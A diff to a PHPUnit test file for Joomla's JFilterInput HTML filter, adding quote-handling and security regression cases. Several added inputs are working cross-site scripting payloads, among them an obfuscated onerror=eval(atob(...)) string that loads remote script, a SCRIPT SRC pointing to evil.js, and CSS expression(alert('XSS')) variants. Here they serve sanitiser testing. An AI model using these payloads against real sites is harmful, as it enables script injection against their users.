@@ -311,6 +311,30 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 				'123.567',
 				'From generic cases'
 			),
+			'string_single_quote' => array(
+				'string',
+				"this is a 'test' of ?",
+				"this is a 'test' of ?",
+				'From generic cases'
+			),
+			'string_double_quote' => array(
+				'string',
+				'this is a "test" of "double" quotes',
+				'this is a "test" of "double" quotes',
+				'From generic cases'
+			),	
+			'string_odd_double_quote' => array(
+				'string',
+				'this is a "test of "odd number" of quotes',
+				'this is a "test of "odd number" of quotes',
+				'From generic cases'
+			),
+			'string_odd_mixed_quote' => array(
+				'string',
+				'this is a "test\' of "odd number" of quotes',
+				'this is a "test\' of "odd number" of quotes',
+				'From generic cases'
+			),
 			'unknown_01' => array(
 				'',
 				'123.567',
@@ -356,7 +380,7 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 			'Malformed Nested tags' => array(
 				'',
 				'<em><strongFred</strong></em>',
-				'<em><strongFred</strong></em>',
+				'<em>strongFred</strong></em>',
 				'From generic cases'
 			),
 			'Unquoted Attribute Without Space' => array(
@@ -412,6 +436,12 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 				'<img class="one two" />',
 				'<img class="one two" />',
 				'Test for recursion with single tags - From generic cases'
+			),
+			'missing_quote' => array(
+				'string',
+				'<img height="123 />',
+				'img height="123 /&gt;"',
+				'From generic cases'
 			),
 		);
 	}
@@ -662,7 +692,37 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 				'<img class="one two" />',
 				'<img />',
 				'From specific cases'
-			)
+			),
+			'security_20110329a' => array(
+				'string',
+				"<img src='<img src='///'/> ",
+				'<img /> ',
+				'From specific cases'
+			),		
+			'security_20110329b' => array(
+				'string',
+				"<img src='<img src='/onerror=eval(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=/.source))//'/> ",
+				'<img /> ',
+				'From specific cases'
+			),
+			'hanging_quote' => array(
+				'string',
+				"<img src=\' />",
+				'<img />',
+				'From specific cases'
+			),
+			'hanging_quote2' => array(
+				'string',
+				'<img src slkdjls " this is "more " stuff',
+				'img src slkdjls " this is "more " stuff',
+				'From specific cases'
+			),
+			'hanging_quote3' => array(
+				'string',
+				"<img src=\"\'\" />",
+				'<img />',
+				'From specific cases'
+			),				
 		);
 		$tests = array_merge($this->casesGeneric(), $casesSpecific);
 
@@ -954,7 +1014,7 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 			'security_tracker_24802_e' => array(
 				'',
 				'<img src=<img src=x"/onerror=alert(1)//">',
-				'<img src=<img src="x/onerror=alert(1)//" />',
+				'img src=<img src="x/onerror=alert(1)//" />',
 				'From specific cases'
 			),
 			'empty_alt' => array(
@@ -1022,6 +1082,60 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 				'<p class="my_class">This is a <a href="http://mysite.com" img = "my_image">link test</a>. This is <span class="myclass" font = "myfont" > some more</span> text.</p>',
 				'<p class="my_class">This is a <a href="http://mysite.com" img="my_image">link test</a>. This is <span class="myclass" font="myfont"> some more</span> text.</p>',
 				'Test valid nested tag'
+			),
+			'hanging_quote' => array(
+				'string',
+				"<img src=\' />",
+				'<img src="" />',
+				'From specific cases'
+			),
+			'hanging_quote2' => array(
+				'string',
+				'<img src slkdjls " this is "more " stuff',
+				'img src slkdjls " this is "more " stuff',
+				'From specific cases'
+			),
+			'hanging_quote3' => array(
+				'string',
+				"<img src=\"\' />",
+				'img src="\\\' /&gt;"',
+				'From specific cases'
+			),		
+			'tracker25558a' => array(
+				'string',
+				'<SCRIPT SRC=http://jeffchannell.com/evil.js#<B />',
+				'SCRIPT SRC=http://jeffchannell.com/evil.js#<B />',
+				'Test mal-formed element from 25558a'
+			),
+			'tracker25558b' => array(
+				'string',
+				'<IMG STYLE="xss:expression(alert(\'XSS\'))" />',
+				'<IMG STYLE="xss(alert(\'XSS\'))" />',
+				'Test mal-formed element from 25558b'
+			),	
+			'tracker25558c' => array(
+				'string',
+				'<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))" />',
+				'<IMG STYLE="xss(alert(\'XSS\'))" />',
+				'Test mal-formed element from 25558b'
+			),	
+			'tracker25558d' => array(
+				'string',
+				'<IMG STYLE="xss:expr/*XSS*/ess/*another comment*/ion(alert(\'XSS\'))" />',
+				'<IMG STYLE="xss(alert(\'XSS\'))" />',
+				'Test mal-formed element from 25558b'
+			),			
+			'tracker25558e' => array(
+				'string',
+				'<b><script<b></b><alert(1)</script </b>',
+				'<b>script<b></b>alert(1)/script</b>',
+				'Test mal-formed element from 25558e'
+			),	
+			'security_20110329a' => array(
+				'string',
+				"<img src='<img src='///'/> ",
+				"<img src=\"'&lt;img\" src=\"'///'/\" /> ",
+				'From specific cases'
 			),
 		);
 		$tests = array_merge($this->casesGeneric(), $casesSpecific);
@@ -1112,7 +1226,14 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 				'<img class="one two" />',
 				'',
 				'From specific cases'
-			)
+			),
+			'security_20110328' => array(
+				'string',
+				"<img src='<img 
+src='/onerror=eval(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=/.source))//'/> ",
+				' ',
+				'From specific cases'
+			),			
 		);
 		$tests = array_merge($this->casesGeneric(), $casesSpecific);
 
